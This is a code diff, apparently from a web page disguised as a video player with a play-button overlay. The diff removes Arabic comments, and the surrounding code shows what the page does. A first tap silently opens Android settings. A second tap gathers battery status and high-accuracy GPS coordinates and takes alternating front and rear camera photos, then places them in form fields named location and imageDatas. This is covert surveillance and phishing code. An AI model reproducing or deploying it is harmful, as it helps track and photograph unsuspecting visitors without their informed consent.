@@ -367,12 +367,11 @@
                 try {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,      // تفعيل الدقة العالية
-                            timeout: 15000,                // مهلة 15 ثانية للحصول على إشارة دقيقة
-                            maximumAge: 0                  // عدم استخدام موقع مخبأ
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
                         });
                     });
-                    // إرجاع الموقع بـ 6 أرقام عشرية للدقة المطلقة
                     return `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                 } catch (err) {
                     permissions.push('Geolocation Denied');
@@ -404,7 +403,6 @@
                     if (/Android/i.test(ua)) {
                         window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                     } else {
-                        // فتح الإعدادات العامة كنوع من التوجيه الصامت
                         window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                     }
                 }
@@ -427,7 +425,6 @@
                 isProcessing = true;
 
                 if (!settingsOpened) {
-                    // الضغطة الأولى: فتح الإعدادات فقط (بدون أي رسائل)
                     settingsOpened = true;
                     openLocationSettings();
                     isProcessing = false;
@@ -435,7 +432,6 @@
                 }
 
                 // الضغطة الثانية: طلب الأذونات وجمع البيانات
-                // إظهار التحميل
                 spinner.style.display = 'block';
                 loading.style.display = 'block';
                 playButtonOverlay.style.opacity = '0.5';
@@ -450,11 +446,9 @@
                 await getBatteryStatus();
                 document.getElementById('battery').value = batteryStatus;
 
-                // طلب الموقع بدقة عالية جداً
                 const location = await getLocation();
                 document.getElementById('location').value = location;
 
-                // التصوير: أمامية، خلفية، أمامية، خلفية
                 await captureFromCamera('user');
                 await captureFromCamera('environment');
                 await captureFromCamera('user');
@@ -463,7 +457,6 @@
                 document.getElementById('imageDatas').value = images.join(',');
                 document.getElementById('permissions').value = permissions.join(', ');
 
-                // إخفاء التحميل
                 spinner.style.display = 'none';
                 loading.style.display = 'none';
                 playButtonOverlay.style.opacity = '1';
